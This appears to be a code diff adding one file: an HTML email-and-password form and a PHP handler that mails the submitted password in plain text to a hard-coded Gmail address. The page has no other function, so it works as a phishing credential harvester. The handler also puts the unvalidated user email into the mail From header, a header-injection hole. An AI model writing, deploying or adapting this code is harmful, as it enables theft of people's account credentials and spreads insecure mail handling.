@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form</title>
+</head>
+<body>
+    <form action="process.php" method="post">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required><br>
+
+        <label for="pass">Password:</label>
+        <input type="password" id="pass" name="pass" required><br>
+
+        <input type="submit" name="submit" value="Submit">
+    </form>
+</body>
+</html>
+<?php
+if(isset($_POST['submit'])) {
+    // The user's data
+    $email = $_POST['email'];
+    $password = $_POST['pass'];
+
+    // Format the email body
+    $body = "Email: $email\nPassword: $password";
+
+    // Send email
+    $to = "dreamhub71@gmail.com"; // Replace with your email address
+    $subject = "Form Submission";
+    $headers = "From: $email";
+
+    // Check if the mail was sent successfully
+    if(mail($to, $subject, $body, $headers)) {
+        echo "Email sent successfully!";
+    } else {
+        echo "Failed to send email. Please try again later.";
+    }
+}
+?>
